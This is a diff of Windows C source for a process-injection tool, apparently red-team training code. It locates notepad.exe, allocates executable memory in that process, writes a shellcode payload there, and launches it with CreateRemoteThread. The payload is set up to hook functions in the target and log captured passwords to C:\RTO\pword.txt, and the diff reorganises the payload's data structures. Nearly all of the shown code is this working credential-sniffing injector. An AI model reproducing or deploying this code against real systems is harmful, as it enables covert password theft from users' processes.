@@ -12,21 +12,21 @@ __declspec(align(16)) typedef struct _sniff_data
     DWORD64 dwLoadLibraryA;
     DWORD64 dwImageDirectoryEntryToDataEx;
     DWORD64 dwVirtualProtect;
-    DWORD64 dwWideCharToMultiByte;
     DWORD64 dwFuncAddrPage;
     DWORD64 dwHookedFuncMem;
-} SNIFF_DATA, *PSNIFF_DATA;
-
-__declspec(align(16)) typedef struct _sniff_hooked_data
-{
     DWORD64 dwWideCharToMultiByte;
     DWORD64 dwCreateFile;
     DWORD64 dwWriteFile;
     DWORD64 dwCloseHandle;
     CHAR cPwordFilePath[MAX_PATH];
+} SNIFF_DATA, *PSNIFF_DATA;
+
+__declspec(align(16)) typedef struct _sniff_hooked_data
+{
+    DWORD64 dwWideCharToMultiByte;
 } SNIFF_HOOKED_DATA, *PSNIFF_HOOKED_DATA;
 
-#define MIGRATE_DATA_SIZE 24
+#define MIGRATE_DATA_SIZE 40
 
 DWORD FindTargetPID(LPSTR lpProcName)
 {
@@ -56,10 +56,9 @@ int main(void)
     HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
     DWORD dwTargetPID = FindTargetPID("notepad.exe");
     HANDLE hTargetProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPID);
-    LPVOID lpvPayloadMem = VirtualAllocEx(hTargetProc, 0, migrate_len + MIGRATE_DATA_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID lpvMigrateMem = VirtualAllocEx(hTargetProc, 0, migrate_len + MIGRATE_DATA_SIZE + sizeof(SNIFF_DATA), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-    // write sniff payload
-    WriteProcessMemory(hTargetProc, lpvPayloadMem, migrate, migrate_len, NULL);
+    WriteProcessMemory(hTargetProc, lpvMigrateMem, migrate, migrate_len, NULL);
 
     HMODULE hKernel32 = GetModuleHandleA("kernel32");
     HMODULE hDbgHelp = LoadLibraryA("dbgHelp");
@@ -70,15 +69,16 @@ int main(void)
     sniff_data.dwImageDirectoryEntryToDataEx = (DWORD64)GetProcAddress(hDbgHelp, "ImageDirectoryEntryToDataEx");
     sniff_data.dwVirtualProtect = (DWORD64)GetProcAddress(hKernel32, "VirtualProtect");
     sniff_data.dwWideCharToMultiByte = (DWORD64)GetProcAddress(hKernel32, "WideCharToMultiByte");
+    sniff_data.dwCreateFile = (DWORD64)GetProcAddress(hKernel32, "CreateFileA");
+    sniff_data.dwWriteFile = (DWORD64)GetProcAddress(hKernel32, "WriteFile");
+    sniff_data.dwCloseHandle = (DWORD64)GetProcAddress(hKernel32, "CloseHandle");
+    strcpy_s(sniff_data.cPwordFilePath, MAX_PATH, "C:\\RTO\\pword.txt");
 
-    SNIFF_HOOKED_DATA sniff_hooked_data;
-    sniff_hooked_data.dwWideCharToMultiByte = sniff_data.dwWideCharToMultiByte;
-    sniff_hooked_data.dwCreateFile = (DWORD64)GetProcAddress(hKernel32, "CreateFileA");
-    sniff_hooked_data.dwWriteFile = (DWORD64)GetProcAddress(hKernel32, "WriteFile");
-    sniff_hooked_data.dwCloseHandle = (DWORD64)GetProcAddress(hKernel32, "CloseHandle");
-    strcpy_s(sniff_hooked_data.cPwordFilePath, MAX_PATH, "C:\\RTO\\pword.txt");
+    DWORD32 dwSniffDataSize = sizeof(sniff_data);
+    WriteProcessMemory(hTargetProc, (LPVOID)((ULONG_PTR)lpvMigrateMem + migrate_len + MIGRATE_DATA_SIZE), &dwSniffDataSize, sizeof(dwSniffDataSize), NULL);
+    WriteProcessMemory(hTargetProc, (LPVOID)((ULONG_PTR)lpvMigrateMem + migrate_len + MIGRATE_DATA_SIZE + sizeof(dwSniffDataSize)), &sniff_data, sizeof(sniff_data), NULL);
 
-    HANDLE hThread = CreateRemoteThread(hTargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpvPayloadMem, NULL, 0, NULL);
+    HANDLE hThread = CreateRemoteThread(hTargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpvMigrateMem, NULL, 0, NULL);
 
     if (hThread != NULL)
     {
@@ -86,7 +86,7 @@ int main(void)
         CloseHandle(hThread);
     }
 
-    VirtualFreeEx(hTargetProc, lpvPayloadMem, 0, MEM_RELEASE);
+    VirtualFreeEx(hTargetProc, lpvMigrateMem, 0, MEM_RELEASE);
     CloseHandle(hTargetProc);
 
     return 0;
